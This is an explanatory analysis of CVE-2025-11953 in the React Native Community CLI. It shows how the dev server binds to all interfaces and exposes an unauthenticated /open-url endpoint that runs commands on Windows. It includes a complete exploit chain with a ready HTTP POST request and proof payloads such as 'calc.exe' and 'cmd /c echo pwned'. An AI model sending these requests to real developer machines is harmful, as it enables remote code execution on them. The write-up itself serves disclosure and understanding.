https://jfrog.com/blog/cve-2025-11953-critical-react-native-community-cli-vulnerability/


## 1️⃣ The dev server entry point

When a developer runs:

```bash
npx react-native start
```

this eventually executes **`runServer.js`** from
`@react-native-community/cli-plugin`.

Relevant code (simplified but accurate):

```js
const hostname = args.host?.length ? args.host : 'localhost';

console.info(`Starting dev server on http://${hostname}:${port}`);

await Metro.runServer(metroConfig, {
  host: args.host,   // ❌ BUG: should be hostname
  port,
});
```

### What is supposed to happen

If `args.host` is undefined:

* `hostname` becomes `"localhost"`
* Server should bind to `localhost`

### What actually happens

`host: args.host` → `undefined`

Node.js behavior (documented):

```js
server.listen(port, undefined)
```

means:

➡️ **bind to `0.0.0.0` / `::`**

So the dev server listens on **all interfaces**.

No debate. This is deterministic.

---

## 2️⃣ Middleware injection (this matters)

Before the server starts, this runs:

```js
import { createDevServerMiddleware } from './middleware';

const { middleware } = createDevServerMiddleware(...);

await Metro.runServer(..., {
  unstable_extraMiddleware: [middleware],
});
```

That middleware is now live on the HTTP server.

---

## 3️⃣ The vulnerable middleware

Inside
`@react-native-community/cli-server-api`

File: `openURLMiddleware.ts`

Exact logic (trimmed only for noise):

```ts
import open from 'open';
import connect from 'connect';
import json from 'body-parser';

async function openURLMiddleware(req, res, next) {
  if (req.method === 'POST' && req.url === '/open-url') {
    const { url } = req.body;   // ❌ untrusted input
    await open(url);            // ❌ passed directly to OS
  }
  next();
}

export default connect()
  .use(json())
  .use(openURLMiddleware);
```

No auth.
No origin check.
No hostname check.
No sanitization.

Anything that can reach the port can hit this.

---

## 4️⃣ What `open(url)` actually does (this is the core)

### On **Windows**, `open` (v6.4.0) does:

see https://www.npmjs.com/package/open

```js
const command = 'cmd';
const args = ['/c', 'start', '""', '/b', target];

spawn(command, args);
```

Where:

* `target` = attacker-controlled `url`

So the OS receives:

```cmd
cmd /c start "" /b <ATTACKER_INPUT>
```

This is not speculation. This is literal behavior.

---

## 5️⃣ Why this becomes RCE on Windows

Windows `start` syntax:

```cmd
start "title" /b program [args]
```

So if attacker sends:

```json
{"url":"calc.exe"}
```

Executed command becomes:

```cmd
cmd /c start "" /b calc.exe
```

➡️ Calculator runs.

If attacker sends:

```json
{"url":"cmd /c echo pwned > C:\\temp\\pwned.txt"}
```

Executed command becomes:

```cmd
cmd /c start "" /b cmd /c echo pwned > C:\temp\pwned.txt
```

➡️ File is created.

**That is arbitrary command execution.**

No escaping required.
No shell injection tricks.
This is intended Windows behavior.

---

## 6️⃣ Why Linux/macOS do NOT behave the same

On Linux:

```js
spawn('xdg-open', [target]);
```

On macOS:

```js
spawn('open', [target]);
```

Key differences:

* ❌ No `sh -c`
* ❌ No shell interpretation
* ❌ No command chaining

So attacker input:

```json
{"url":"ping -c 1 attacker.com"}
```

Becomes:

```bash
xdg-open "ping -c 1 attacker.com"
```

That just fails or opens nothing.

➡️ **No generic RCE**

But:

* Still untrusted input
* Still OS-level invocation
* Still exploitable via handlers, file URIs, etc. (environment-dependent)

That’s why Linux/macOS are **exposed but not trivially exploitable**.

---

## 7️⃣ The complete exploit chain (no gaps)

1. Dev runs `npx react-native start`
2. Server binds to `0.0.0.0:8081`
3. Attacker sends HTTP request:

```http
POST /open-url HTTP/1.1
Host: victim:8081
Content-Type: application/json

{"url":"calc.exe"}
```

4. Middleware receives request
5. `open(url)` executes OS command
6. Windows runs attacker-controlled program

* Or tear apart why `start` is a security nightmare historically
